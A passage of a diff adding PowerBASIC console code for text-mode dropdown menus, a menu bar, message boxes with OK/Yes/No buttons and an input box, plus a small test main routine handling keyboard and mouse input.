+LOCAL RodentX AS LONG    'Mouse Cursor Column
+LOCAL RodentY AS LONG    'Mouse Cursor Row
+LOCAL RodentB AS LONG    'Mouse Button
+LOCAL MaxRow  AS LONG    'Bottom of menu
+LOCAL MaxCol  AS LONG    'Left side of menu
+LOCAL NFcolor AS INTEGER, NBcolor AS INTEGER
+LOCAL HFcolor AS INTEGER, HBcolor AS INTEGER
+  NFcolor = MessBox.MuFclr   'Normal Dropdown FGcolor
+  NBcolor = MessBox.MuBclr   '  ""      ""    BGcolor
+  HFcolor = MessBox.MuHFcl   'Hilighted dropdown FGcolor
+  HBcolor = MessBox.MuHBcl   '   ""        ""    BGcolor
+  tBox = MessBox       'initialize local structure
+  LastItem = 1         'First item in menu
+  NumItems = Items.NumItems   '# defined in InitMenu
+  DIM Menu1(1 TO NumItems)    'dropdown menu outline array
+  Row = Items.Row(1)          'Defined in InitMenu
+  Col = Items.Col(1)
+  tBox.ULx = Col
+  tBox.ULy = Row
+  tbox.FGColr = MessBox.MuFclr   'set dropdown FGcolor
+  tbox.BGColr = MessBox.MuBclr   ' "     "     BGcolor
+  FOR I = 1 TO NumItems   'create string array
+    Menu1(I) = Items.menu(I)
+  NEXT I
+  CALL DrawBox(Menu1(), tBox)  'draw dropdown
+  ERASE Menu1              'release memory
+  Show_Items: '
+  MenuTop = tBox.ULy 'calculated in DrawBox
+  Col = tBox.ULx
+  Row = tBox.ULy     'MenuTop
+  MaxRow = Row + NumItems - 1   'Row of bottom menu item
+  MaxCol = Items.Col(1) + LEN(Items.Menu(1)) - 1  'Right side of menu
+HiLite_Item: '
+  CALL ColorWords(Row, Col, HFcolor, HBcolor, BYCOPY Items.Menu(LastItem))
+FNKey: '*** Find out what the user is doing
+  Key = KeyPress(RodentX, RodentY, RodentB)
+  IF Key > 255 THEN    'check for mouse event
+    IF RodentB THEN    'mouse button press
+      ' Close menu
+      IF (RodentY < MenuTop) OR (RodentY > MaxRow) THEN EXIT FUNCTION
+      IF (RodentX < Col) OR (RodentX > MaxCol) THEN EXIT FUNCTION
+    ELSE   'no action - mouse outside of menu area
+      IF (RodentY < MenuTop) OR (RodentY > MaxRow) THEN GOTO FNKey
+      IF (RodentX < Col) OR (RodentX > MaxCol) THEN GOTO FNKey
+    END IF
+    FOR I = 1 TO NumItems   'Track mouse while in menu area
+      IF RodentY = Items.Row(I) + 1 THEN
+        ' Make color normal
+        CALL ColorWords(Row, Col, NFcolor, NBcolor, _
+                      BYCOPY Items.Menu(LastItem))
+        LastItem = I
+        Row = Items.Row(I) + 1
+        ' Highlight text
+        CALL ColorWords(Row, Col, HFcolor, HBcolor, BYCOPY Items.Menu(LastItem))
+        IF RodentB THEN     'check button again
+          FNMenu = LastItem
+          EXIT FUNCTION
+        END IF
+      END IF
+    NEXT I
+    GOTO FNKey
+  END IF
+  IF (Key = -80) OR (key = 9) THEN  'down arrow or tab
+    IF LastItem >= NumItems THEN
+      CALL ColorWords(Row, Col, NFcolor, NBcolor, _
+                    BYCOPY Items.Menu(LastItem))
+      LastItem = 1
+      Row = MenuTop
+      GOTO HiLite_Item
+    END IF
+    CALL ColorWords(Row, Col, NFcolor, NBcolor, _
+                  BYCOPY Items.Menu(LastItem))
+    INCR LastItem
+    INCR Row
+    GOTO HiLite_Item
+  END IF
+  IF Key = -72 THEN               'up arrow
+    IF LastItem <= 1 THEN
+      CALL ColorWords(Row, Col, NFcolor, NBcolor, _
+                      BYCOPY Items.Menu(LastItem))
+      LastItem = NumItems
+      Row = Row + NumItems - 1
+      GOTO HiLite_Item
+    END IF
+    CALL ColorWords(Row, Col, NFcolor, NBcolor, _
+                  BYCOPY Items.Menu(LastItem))
+    DECR LastItem
+    DECR Row
+    GOTO HiLite_Item
+  END IF
+  IF (Key = -75) OR (Key = -77) THEN  'left or right arrow
+    FNMenu = Key
+    EXIT FUNCTION
+  END IF
+  IF (Key = 13) THEN         'ENTER key - item selected
+    FNMenu = LastItem
+    EXIT FUNCTION
+  ELSEIF (Key = 27) THEN     'ESC key - abort selection
+    FNMenu = 0
+    EXIT FUNCTION
+  ELSE
+    GOTO FNKey
+  END IF
+END FUNCTION
+
+FUNCTION DispMain(Items AS MenuMain,Cs AS INTEGER,Ms AS INTEGER) AS LONG
+'*******************************************************************
+'             Handles the main menu (menu bar)
+' Items = headings in menu bar
+' Cs = Current screen number
+' Ms = Menu screen number
+'*******************************************************************
+STATIC sSize  AS LONG
+LOCAL lSize   AS LONG
+LOCAL lI AS LONG
+LOCAL lastitem AS LONG
+LOCAL row AS LONG
+LOCAL col AS LONG
+LOCAL key AS LONG
+LOCAL fKey AS LONG        'Function Key calculation (F1 - F10)
+LOCAL RodentX AS LONG     'Mouse Cursor Column
+LOCAL RodentY AS LONG     'Mouse Cursor Row
+LOCAL RodentB AS LONG     'Mouse Button
+LOCAL MaxRow  AS LONG     'Bottom of Menu
+LOCAL MaxCol  AS LONG     'Width of Menu
+LOCAL NFcolor AS INTEGER  'Normal foreground
+LOCAL NBcolor AS INTEGER  'Normal background
+LOCAL HFcolor AS INTEGER  'High light foreground
+LOCAL HBcolor AS INTEGER  'High light background
+  NFcolor = MessBox.MuFclr
+  NBcolor = MessBox.MuBclr
+  HFcolor = MessBox.MuHFcl
+  HBcolor = MessBox.MuHBcl
+  fkey = -(59 + items.numitems)  'Function key Offset
+  MaxRow = Items.Row(1)          'start of menu bar
+  MaxCol = LEN(Items.Menu(1))    'size of bar item
+Locate_Menu: ' Next 2 routines refresh the bar
+  COLOR NFcolor, NBcolor
+  LOCATE Items.Row(1), Items.Col(1)
+  PRINT STRING$(80, " ");
+show_items:
+  FOR lI = 1 TO Items.NumItems
+    LOCATE Items.row(lI), Items.Col(lI)
+    PRINT Items.Menu(lI)
+  NEXT lI
+  PCOPY Cs, Ms                   'save it
+  Row = Items.Row(1)             'first item
+  Col = Items.Col(1)             'where the bar is
+  lastitem = 1
+HiLite_Item: ' Highlight the bar item
+  CALL ColorWords(Row, Col, HFcolor, HBcolor, BYCOPY Items.Menu(LastItem))
+FNKey: '*** Find out what the user is doing
+  Key = KeyPress(RodentX, RodentY, RodentB)
+  'Check for mouse movement and left button press
+  'If mouse status has changed, Key will = 32767
+  IF Key > 255 THEN
+    'If the mouse cursor is above or below the menu, no action will occur
+    IF RodentY > MaxRow OR RodentY < Items.Row(1) THEN GOTO Con1
+    'Check for column range
+    FOR lI = 1 TO Items.NumItems
+      IF (RodentX < Items.Col(lI)) OR (RodentX > Items.Col(lI) + MaxCol - 1) THEN
+        GOTO Next_Item
+      END IF
+      'Make last menu item normal color
+      CALL ColorWords(Row, Col, NFcolor, NBcolor, BYCOPY Items.Menu(LastItem))
+      Col = Items.Col(lI)
+      LastItem = lI
+      'Hilite new menu item
+      CALL ColorWords(Row, Col, HFcolor, HBcolor, BYCOPY Items.Menu(LastItem))
+      IF RodentB THEN         'check for button press
+        DispMain = LastItem
+        EXIT FUNCTION
+      END IF
+      GOTO FNKey
+Next_Item: '
+    NEXT lI
+  END IF
+Con1: ' Check function key status
+  IF (key < -58) AND (key > fkey) THEN
+    CALL ColorWords(Row, Col, NFcolor, NBcolor, BYCOPY Items.Menu(LastItem))
+    LastItem = ABS(key) - 58
+    Col = Items.Col(LastItem)
+    CALL ColorWords(Row, Col, HFcolor, HBcolor, BYCOPY Items.Menu(LastItem))
+    dispmain = LastItem
+    EXIT FUNCTION
+  END IF
+  IF (Key = -77) OR (key = 9) THEN  'Right arrow key or tab
+    IF LastItem >= Items.NumItems THEN
+      CALL ColorWords(Row, Col, NFcolor, NBcolor, _
+                    BYCOPY Items.Menu(LastItem))
+      LastItem = 1
+      Col = Items.Col(LastItem)
+      GOTO HiLite_Item
+    END IF
+    CALL ColorWords(Row, Col, NFcolor, NBcolor, BYCOPY Items.Menu(LastItem))
+    INCR LastItem
+    Col = Items.Col(LastItem)
+    GOTO HiLite_Item
+  END IF
+  IF Key = -75 THEN            'Left arrow key
+    IF LastItem <= 1 THEN
+      CALL ColorWords(Row, Col, NFcolor, NBcolor, BYCOPY Items.Menu(LastItem))
+      LastItem = Items.NumItems
+      Col = Items.Col(LastItem)
+      GOTO HiLite_Item
+    END IF
+    CALL ColorWords(Row, Col, NFcolor, NBcolor, BYCOPY Items.Menu(LastItem))
+    DECR LastItem
+    Col = Items.Col(LastItem)
+    GOTO HiLite_Item
+  END IF
+  IF (Key = 13) THEN          'menu selected
+    dispmain = LastItem
+    EXIT FUNCTION
+  ELSEIF (key = 27) THEN      'no selection
+    dispmain = 0
+    EXIT FUNCTION
+  ELSE
+    GOTO FNKey
+  END IF
+END FUNCTION
+
+FUNCTION MENU(Items AS MenuMain, Mnuitems() AS Umenu) AS LONG
+'****************************************************
+'        Controls dropdown menu selection
+'****************************************************
+LOCAL curscreen%,storescreen%,menuscreen%
+STATIC MenuLoc() AS LONG    '*** Not Used
+LOCAL lresult AS LONG       'Return valuse from functions called
+LOCAL menuno AS LONG        ' ditto
+STATIC MenuSize AS LONG
+LOCAL Row AS LONG, Col AS LONG
+LOCAL HFcolor AS INTEGER, HBcolor AS INTEGER
+LOCAL NFcolor AS INTEGER, NBcolor AS INTEGER
+LOCAL I AS LONG
+  HFcolor = MessBox.MuHFcl
+  HBcolor = MessBox.MuHBcl
+  NFcolor = MessBox.MuFclr
+  NBcolor = MessBox.MuBclr
+  CurScreen% = 1
+  StoreScreen% = 2
+  MenuScreen% = 3
+redo:
+  IF ISFALSE MenuSize THEN
+    REDIM MenuLoc(1 TO CurScreen%)
+  END IF
+  PCOPY CurScreen%, StoreScreen%
+  '    Get menu bar selection
+  lresult = DispMain(Items, CurScreen, MenuScreen)
+  MenuSize = Items.NumItems   'Number of dropdown menus (from InitMenu)
+  menuno = lresult            'Which item selected
+Check_Result: '
+'************************** SELECT DROPDOWM ITEM ******************
+' The following loop will have to be modified if there are more than
+' 8 menubar items or the return from FNMenu for TAB modified
+' the use of more than 8 items is not reccommended as they will be
+' past the edge of the displayed screen.
+'******************************************************************
+  FOR I = 1 TO MenuSize
+    IF I = lresult THEN
+      Row = Items.Row(I)
+      Col = Items.Col(I)
+      CALL ColorWords(Row, Col, HFcolor, HBcolor, BYCOPY Items.Menu(I))
+      lresult = FNMenu(Mnuitems(I))
+      EXIT FOR
+    END IF
+  NEXT I
+  'Selection from FNMenu
+  SELECT CASE lresult
+    CASE -77, -75, 9      'left arrow, right arrow, tab
+      PCOPY MenuScreen%, CurScreen%
+      SELECT CASE lresult
+        CASE -75          'left arrow
+          DECR menuno
+          IF menuno < 1 THEN menuno = MenuSize
+          lresult = menuno
+          Row = Items.Row(Menuno)
+          Col = Items.Col(Menuno)
+          CALL ColorWords(Row, Col, NFcolor, NBcolor, BYCOPY Items.Menu(Menuno))
+          GOTO Check_Result
+        CASE -77,9        'right arrow, tab
+          INCR menuno
+          IF MenuNo > MenuSize THEN MenuNo = 1
+          lresult = menuno
+          CALL ColorWords(Row, Col, NFcolor, NBcolor, BYCOPY Items.Menu(Menuno))
+          GOTO Check_Result
+        CASE 0
+          lresult = 0
+      END SELECT
+  END SELECT
+  PAGE StoreScreen%, StoreScreen%
+  PCOPY StoreScreen%, CurScreen%
+  PAGE CurScreen%, CurScreen%
+  IF lresult = 0 THEN
+    MENU = 0
+  ELSE
+    MENU = lresult+(menuno*10)  '2 digit code for item in drop down
+  END IF
+END FUNCTION
+
+SUB showbar(ems AS MenuMain)
+LOCAL lI AS LONG
+'************************* PRINT MENU BAR ***********************
+  LOCATE ems.Row(1), ems.Col(1)
+  COLOR MessBox.MuFclr, MessBox.MuBclr
+  PRINT STRING$(80, " ");
+  FOR lI = 1 TO ems.NumItems
+    LOCATE ems.Row(lI), ems.Col(lI)
+    PRINT ems.Menu(lI);
+  NEXT lI
+END SUB
+
+FUNCTION MSGBOX(MesType AS LONG, Msg() AS STRING, fcolor AS INTEGER, _
+     bcolor AS INTEGER, hcolor AS INTEGER,hbcolor AS INTEGER) AS LONG
+'**************************************************************
+' ARGUMENT LIST:
+' MesType can be 0, 1, 2 or 3
+'    0 = No buttons, no input box (dropdown menu)
+'    1 = OK button only
+'    2 = YES and NO buttons
+'    3 = Input Box, OK button, Cancel button
+'*** MesType 0 (dropdown menu) is handled in FNMenu
+'
+' Msg() can be up to 16 elements on a 25 row screen, and up to 77 characters
+'    on an 80 column screen.  Msg() must be dimensioned 1 TO NumberOfElements
+' If MesType = 3, the input is returned in Msg(1)
+' 4 colors--fcolor=normal foreground bcolor=normal background
+'           hcolor=hilite foreground hbcolor=hilite background
+'for text hilite set hcolor to contrasting color and hbcolor=bcolor
+'for background hilite set hcolor=fcolor and hbcolor to contrasting color
+'msgbox returns a 2 digit number--1st number is message type
+'                                 2nd number is chosen button
+'************************************************************* **
+LOCAL tBox AS Box, tButn AS BUTTON
+LOCAL sYesButton AS STRING, sNoButton AS STRING
+LOCAL sInputBox  AS STRING
+LOCAL Xcurs AS LONG, YCurs AS LONG
+LOCAL key AS LONG, lStrPos AS LONG
+LOCAL curscreen AS INTEGER, storescreen AS INTEGER
+LOCAL RodentX AS LONG       'Mouse Cursor Column
+LOCAL RodentY AS LONG       'Mouse Cursor Row
+LOCAL RodentB AS LONG       'Mouse Button
+  curscreen% = 1
+  storescreen% = 2
+  PCOPY CurScreen%, StoreScreen%
+  CURSOR OFF
+  tBox = MessBox         'initialize
+  tBox.BoxTyp = MesType
+  tBox.FGcolr = fcolor
+  tBox.BGcolr = bcolor
+  CALL DrawBox(Msg(), tBox, tButn) 'draw message box
+  SELECT CASE MesType
+    CASE 1, 2
+      sYesButton = TRIM$(tBox.OkButn) 'set up for toggling
+      sNoButton = TRIM$(tBox.NoButn)  'highlight button focus
+      CALL ColorWords(BYCOPY tButn.OKy, BYCOPY tButn.OKx, Hcolor, _
+                    hbcolor, sYesButton)
+    CASE 3
+      sYesButton = TRIM$(tBox.OkButn)
+      sNoButton = TRIM$(tBox.NoButn)
+      sInputBox = STRING$(62, " ")
+      'returned to normal colors for input box
+      CALL ColorWords(BYCOPY tButn.INy, BYCOPY tButn.INx, Fcolor, _
+                    bcolor, sInputBox)
+      LOCATE tButn.INy, tButn.INx
+      CURSOR ON, 20
+      Xcurs = tButn.INx
+      Ycurs = tButn.INy
+  END SELECT
+  sInputBox = ""     'container for input box entry
+fnkey:
+  Key = KeyPress(RodentX, RodentY, RodentB)
+  SELECT CASE MesType
+    CASE 1
+      IF Key > 255 THEN     ' Check for mouse event
+        IF (RodentY <> tButn.OKy) THEN GOTO fnkey  ' Not button row
+        ' check for mouse in button
+        IF (RodentX < tButn.OKx) OR _
+          (RodentX > tButn.OKx + LEN(sYesButton) - 1) THEN GOTO fnKey
+        IF RodentB THEN Key = 13  'mouse in button & left mouse button
+                                  'pressed
+      END IF
+      'OR did not work below, had to change it to AND
+      IF (Key <> 13) AND (Key <> 27) THEN GOTO fnkey
+      MSGBOX = 11
+      GOTO CleanUp
+    CASE 2
+      IF Key > 255 THEN     'Check for mouse event
+        IF (RodentY <> tButn.OKy) THEN GOTO fnkey 'Not in button row
+        ' check for which button
+        Key = ABS((RodentX > tButn.OKx AND RodentX < tButn.Okx + _
+                   LEN(sYesButton)) + 2 * (RodentX > tButn.Nox _
+                   AND RodentX < tButn.NOx + LEN(sNoButton)))
+        SELECT CASE Key
+          CASE 1             ' in OK button
+            IF RodentB THEN
+              MSGBOX = 21
+              GOTO CleanUp
+            END IF
+          CASE 2             ' in Cancel button
+            IF RodentB THEN
+              MSGBOX = 22
+              GOTO CleanUp
+            END IF
+        END SELECT
+        GOTO fnkey
+      END IF
+      'Key press events
+      IF (Key = -77) OR (Key = -75) OR (Key = 9) THEN 'left arrow,
+                                                      'right arrow,
+                                                      'or tab
+        IF tButn.Focus = 1 THEN       'switch button focus
+          tButn.Focus = 2
+          CALL ColorWords(BYCOPY tButn.OKy, BYCOPY tButn.OKx, fcolor, _
+                        bcolor, sYesButton)
+          CALL ColorWords(BYCOPY tButn.Noy, BYCOPY tButn.Nox, hcolor, _
+                        hbcolor, sNoButton)
+        ELSE
+          tButn.Focus = 1
+          CALL ColorWords(BYCOPY tButn.Noy, BYCOPY tButn.Nox, fcolor, _
+                        bcolor, sNoButton)
+          CALL ColorWords(BYCOPY tButn.Oky, BYCOPY tButn.OKx, hcolor, _
+                        hbcolor, sYesButton)
+        END IF
+      END IF
+      IF (Key = 13) THEN          'ENTER was pressed
+        IF tButn.Focus = 1 THEN MSGBOX = 21
+        IF tButn.Focus = 2 THEN MSGBOX = 22
+        GOTO CleanUp
+      END IF
+    CASE 3
+      SELECT CASE Key
+        CASE > 255          'check for mouse event
+                        'input box row      or     button row
+          Key = ABS((RodentY = tButn.InY) + 2 * (RodentY = tButn.OkY))
+          SELECT CASE Key
+            CASE 1                   'in input box row
+              IF (RodentX > tButn.InX) AND (RodentX < tButn.Inx + 62) THEN
+                IF RodentB THEN      'in input box check mouse button
+                                    'press
+                  tButn.Focus = 1
+                  LOCATE Ycurs, Xcurs
+                  CURSOR ON, 20
+                END IF
+              END IF
+              GOTO fnkey
+            CASE 2                   'in button row
+              'check if in OK or Cancle button
+              Key = ABS((RodentX > tButn.OKx AND RodentX < tButn.Okx + _
+                       LEN(sYesButton)) + 2 * (RodentX > tButn.Nox _
+                       AND RodentX < tButn.NOx + LEN(sNoButton)))
+              IF RodentB THEN
+                IF Key = 1 THEN       'OK button
+                  tButn.Focus = 2
+                  Key = 13
+                  GOTO Escape
+                ELSEIF Key = 2 THEN   'Cancle button
+                  tButn.Focus = 3
+                  Key = 13
+                  GOTO Escape
+                END IF
+                GOTO fnkey            'mouse button pressed but not
+                                      'in OK or Cancel
+              END IF
+          END SELECT
+        CASE -80, -15, 9    'down arrow, CTRL + TAB, tab
+          CURSOR OFF        'toggle focus
+          SELECT CASE tButn.Focus
+            CASE 1
+              tButn.Focus = 2
+              CALL ColorWords(BYCOPY tButn.Oky, BYCOPY tButn.Okx, hcolor, _
+                            hbcolor, sYesButton)
+            CASE 2
+              tButn.Focus = 3
+              CALL ColorWords(BYCOPY tButn.Oky, BYCOPY tButn.Okx, fcolor, _
+                            bcolor, sYesButton)
+              CALL colorWords(BYCOPY tbutn.Noy, BYCOPY tbutn.Nox, hcolor, _
+                            hbcolor, sNoButton)
+            CASE 3
+              tButn.Focus = 1
+              CALL ColorWords(BYCOPY tButn.Noy, BYCOPY tButn.Nox, fcolor, _
+                            bcolor, sNoButton)
+              LOCATE Ycurs, Xcurs
+              CURSOR ON, 20
+          END SELECT
+        CASE 13, 27      'ENTER, ESC
+Escape: '
+          'changed to return appropriate button code if these keys pressed
+          'while in input box
+          IF key = 13 THEN
+            SELECT CASE tButn.Focus
+              CASE 1,2
+                Msg(1) = sInPutBox
+                MSGBOX = 32
+              CASE 3
+                Msg(1) = ""
+                Msgbox = 33
+            END SELECT
+          ELSE
+            'input abandoned
+            Msg(1) = ""
+            Msgbox = 33
+          END IF
+          GOTO CleanUp
+        CASE 8
+          IF lStrPos < = 0 THEN
+            lStrPos = 0
+            GOTO FnKey
+          END IF
+          IF ISFALSE CURSOR THEN CURSOR ON, 20
+          MID$(sInputBox, lStrPos, 1) = " "
+          'changed colors for sInputBox to regular colors
+          'this problem was introduced by my 4th color parameter
+          CALL ColorWords(BYCOPY tButn.Iny, BYCOPY tButn.Inx, fColor, _
+                        bcolor, sInputBox)
+          sInputBox = RTRIM$(sInputBox)
+          CALL ColorWords(BYCOPY tButn.Iny, BYCOPY tButn.Inx, fColor, _
+                        bcolor, sInputBox)
+          DECR lStrPos
+          DECR Xcurs
+      CASE > 31
+        'do not allow run over on input box
+        IF LEN(sInputBox) < 62 THEN
+          IF ISFALSE CURSOR THEN CURSOR ON, 20
+          sInputBox = sInputBox + CHR$(Key)
+          CALL ColorWords(Ycurs, Xcurs, fColor, bcolor, CHR$(Key))
+          INCR Xcurs
+          INCR lStrPos
+        END IF
+    END SELECT
+  END SELECT
+  GOTO FnKey
+cleanup:
+  CURSOR ON,20
+  PAGE StoreScreen%, StoreScreen%
+  PCOPY StoreScreen%, CurScreen%
+  PAGE CurScreen%, CurScreen%
+END FUNCTION
+
+SUB DrawBox(sText() AS STRING, typBox AS Box, OPT typB AS BUTTON)
+'**************** DISPLAYS DROPDOWN MENUS AND MESSAGE BOXES ***********
+'DRAWS:
+'      type 0 = dropdown menu
+'      type 1 = 1 button
+'      type 2 = 2 button (YES and NO)
+'      type 3 = input box + 2 buttons (OK and CANCEL)
+'INPUTS:
+'      sText() = array to display in box
+'      typBox  = UDT with display info
+'      typB    = Optional UDT with button info
+
+'POSSIBLE INHANCEMENTS: add code to display default text in input box
+'************************************************************************
+LOCAL lMaxLen AS LONG, NumStrs    AS LONG
+LOCAL I       AS LONG, OldNumStr  AS LONG
+LOCAL Y       AS LONG, CBy        AS LONG
+LOCAL CBx     AS LONG
+LOCAL sYesButn AS STRING, sNoButn AS STRING
+LOCAL s_Top    AS STRING, sBottom AS STRING
+LOCAL sTemp    AS STRING
+LOCAL typBut AS BUTTON
+  NumStrs = UBOUND(sText)
+  OldNumStr = NumStrs
+  FOR I = 1 TO NumStrs
+    Y = LEN(sText(I))
+    lMaxLen = MAX&(Y, lMaxLen)
+  NEXT I
+  CBy = typBox.ScrnY \ 2    'Find center of screen
+  CBx = typBox.ScrnX \ 2
+  '*** type zero (dropdown menu) falls through this ***
+  SELECT CASE typBox.BoxTyp
+    CASE 1, 2, 3
+      typBox.Ulx = CBx - lMaxLen \ 2 - 1  'upper left corner
+      SELECT CASE typBox.BoxTyp
+        CASE 1
+          'pad labels with chr 255 to length desired to max of 6 char
+          sYesButn = STRING$(2,255)+"OK"+STRING$(2,255)
+          typBox.OkButn = sYesButn
+          NumStrs = NumStrs + 4
+          typBox.Uly = CBy - (NumStrs + 1) \ 2
+          REDIM PRESERVE sText(1 TO NumStrs)
+        CASE 2
+          sYesButn = STRING$(1,255)+"YES"+STRING$(2,255)
+          sNoButn =  STRING$(2,255)+"NO"+STRING$(2,255)
+          typBox.OkButn = sYesButn
+          typBox.NoButn = sNoButn
+          NumStrs = NumStrs + 4
+          typBox.Uly = CBy - (NumStrs + 1) \ 2
+          REDIM PRESERVE sText(1 TO NumStrs)
+        CASE 3
+          sYesButn = STRING$(2,255)+"OK"+STRING$(2,255)
+          sNoButn =  "Cancel"
+          typBox.OkButn = sYesButn
+          typBox.NoButn = sNoButn
+          NumStrs = NumStrs + 7
+          IF lMaxLen < 68 THEN lMaxLen = 68
+          typBox.Uly = CBy - (NumStrs + 1) \ 2
+          typBox.Ulx = CBx - lMaxLen \ 2 - 1
+          REDIM PRESERVE sText(1 TO NumStrs)
+      END SELECT
+  END SELECT
+  'Draw the box and fill it with text
+  s_Top = typBox.UlChar + STRING$(lMaxLen ,typBox.HZChar) + typBox.URChar
+  lMaxLen = LEN(s_Top) - 2
+  COLOR typBox.FGcolr, typBox.BGcolr
+  LOCATE typBox.Uly, typBox.Ulx
+  PRINT s_Top
+  Y = typBox.Uly + 1
+  FOR I = 1 TO NumStrs
+    sTemp = sText(I) + STRING$(lMaxLen - LEN(sText(I)), " ")
+    sTemp = typBox.VTChar + sTemp + typBox.VTChar
+    LOCATE Y, typBox.Ulx
+    PRINT sTemp
+    INCR Y
+  NEXT I
+  sBottom = typBox.LLChar + STRING$(lMaxLen, typBox.HZChar) + typBox.LRChar
+  LOCATE Y, typBox.Ulx
+  PRINT sBottom
+  typBox.ULx = typBox.ULx + 1   'set to inside of box
+  typBox.ULy = typBox.ULy + 1
+  '*** Build the buttons; dropdowns fall through this ****
+  SELECT CASE typBox.BoxTyp
+    CASE 1, 2
+      Y = Y - 3
+      typBut.Focus = 1
+      SELECT CASE typBox.BoxTyp
+        CASE 1                   ' button
+          lMaxLen = LEN(sYesButn) + 2    'find center & set left side of
+                                         'button
+          typBut.OKy = Y + 1             'inside button
+          typBut.OKx = CBx - lMaxLen \ 2 - 1  'left side of button
+          LOCATE Y, typBut.OKx
+          s_Top = typBox.UlChar + STRING$(lMaxLen - 2, typBox.HZChar) + _
+                                        typBox.URChar
+          sBottom = typBox.LlChar + STRING$(lMaxLen - 2, typBox.HZChar) + _
+                                          typBox.LRChar
+          PRINT s_Top
+          sTemp = typBox.VTChar + sYesButn + typBox.VTChar 'middle
+          LOCATE Y + 1, typBut.OKx
+          PRINT sTemp
+          LOCATE Y + 2, typBut.OKx
+          PRINT sBottom
+          typBut.OKx = typBut.OKx + 1                      'inside of button
+        CASE 2         '2 buttons; spreads them from center of box
+OK_Cancel: '
+          lMaxLen = LEN(sYesButn) + 2
+          typBut.OKy = Y + 1
+          typBut.OKx = CBx - lMaxLen - 2
+          typBut.Noy = typBut.OKy
+          typBut.Nox = CBx + 2
+          s_Top = typBox.UlChar + STRING$(lMaxLen - 2, typBox.HZChar) + _
+                                        typBox.URChar
+          sBottom = typBox.LlChar + STRING$(lMaxLen - 2, typBox.HZChar) + _
+                                        typBox.LRChar
+          sTemp = typBox.VTChar + sYesButn + typBox.VTChar
+          LOCATE Y, typBut.OKx
+          PRINT s_Top
+          LOCATE Y + 1, typBut.OKx
+          PRINT sTemp
+          LOCATE Y + 2, typBut.OKx
+          PRINT sBottom
+          lMaxLen = LEN(sNoButn) + 2
+          s_Top = typBox.UlChar + STRING$(lMaxLen - 2, typBox.HZChar) + _
+                typBox.URChar
+          sBottom = typBox.LlChar + STRING$(lMaxLen - 2, typBox.HZChar) + _
+                typBox.LRChar
+          sTemp = typBox.VTChar + sNoButn + typBox.VTChar
+          LOCATE Y, typBut.Nox
+          PRINT s_Top
+          LOCATE Y + 1, typBut.Nox
+          PRINT sTemp
+          LOCATE Y + 2, typBut.Nox
+          PRINT sBottom
+          typBut.OKx = typBut.OKx + 1
+          typBut.Nox = typBut.Nox + 1
+      END SELECT
+    CASE 3          'builds input box
+      Y = Y - 6     'location of input box top
+      lMaxLen = 64
+      s_Top = typBox.UlChar + STRING$(lMaxLen - 2, typBox.HZChar) + _
+              typBox.URChar
+      sBottom = typBox.LlChar + STRING$(lMaxLen - 2, typBox.HZChar) + _
+            typBox.LRChar
+      sTemp = typBox.VTChar + STRING$(lMaxLen - 2, " ") + typBox.VTChar
+            typBut.Iny = Y + 1
+      typBut.Inx = CBx - lMaxLen \ 2
+      LOCATE Y, typBut.Inx
+      PRINT s_top
+      LOCATE Y + 1, typBut.Inx
+      PRINT sTemp
+      LOCATE Y + 2, typBut.Inx
+      PRINT sBottom
+      Y = Y + 3
+      typBut.Inx = typBut.Inx + 1
+      typBut.Focus = 1
+      GOTO OK_Cancel
+  END SELECT
+  IF typBox.BoxTyp THEN typB = typBut
+END SUB
+
+FUNCTION CONTROL(active AS LONG)AS LONG
+STATIC MenuItems() AS Umenu
+STATIC Items AS MenuMain
+STATIC NumItems AS LONG
+LOCAL lResult   AS LONG
+LOCAL I         AS LONG
+LOCAL RodentX AS LONG    'Mouse Cursor Column
+LOCAL RodentY AS LONG    'Mouse Cursor Row
+LOCAL RodentB AS LONG    'Mouse Cursor Button
+  I = 1
+  REDIM MenuItems(I TO I)
+  CALL InitMenu(MenuItems(), Items)  'initialize variables
+  CURSOR OFF
+  IF active THEN  'if control(active) is 1 menu at startup
+    CALL ShowBar(Items)
+    lresult = MENU(Items, MenuItems())
+    CONTROL = lresult
+  ELSE
+    SELECT CASE keypress(RodentX, RodentY, RodentB)
+      CASE -50
+        lresult = MENU(Items, MenuItems())
+        CONTROL = lresult
+      CASE ELSE : CONTROL = 0
+    END SELECT
+  END IF
+  CURSOR ON
+END FUNCTION
+
+#IF %test
+FUNCTION PBMAIN
+LOCAL lresult AS LONG
+CONSOLE SCREEN 28, 80     ' set screen 28X80
+  DoubleClick = 1   'double click on left mouse button, 0 for single click
+  MOUSE ON
+  IF DoubleClick THEN
+    MOUSE 1, DOUBLE, MOVE, DOWN
+  ELSE
+    MOUSE 1, MOVE, DOWN
+  END IF
+  DO    ' program control loop
+    COLOR 15,1  ' screen background color
+    CLS    ' erase screen
+    COLOR 15,9  ' color for status line
+    LOCATE 28,1 ' go to bottom info line
+    PRINT STRING$(80," ");     ' clear other text
+    LOCATE 28,1 ' go to bottom line
+    PRINT("<ALT><M> for menu <ESC> to exit menu");
+    lresult = CONTROL(1)  ' 1 = active menu 0 = <alt><m> menu
+    IF lresult = 16 THEN  ' call message box
+      REDIM Mess(1 TO 2) AS STRING
+      Mess(1) = "   Are you sure you want to quit?"
+      Mess(2) = "Any unsaved information will be lost."
+      lresult = MSGBOX(2,   Mess(), 14,      9,     14,    12)
+      '               (type,array,regtext,regback,hitext,hiback)
+      IF lresult = 21 THEN               ' yes to exit
+        EXIT                             ' EXIT from menu exits program
+      ELSE
+        lresult = 0                      ' nullify lresult
+      END IF
+    END IF
+    LOCATE 14,1                          ' menu return code test lines
+    COLOR 15,1                           '   |
+    PRINT("Return Code: "+STR$(lresult));'   |
+    WAITKEY$                             '   V
+    'return code handler here
+    ' select option by menu return
+    'user code here
+    ' program activation start
+  LOOP     ' round and round until = exit code
+END FUNCTION
+#ENDIF
+ã
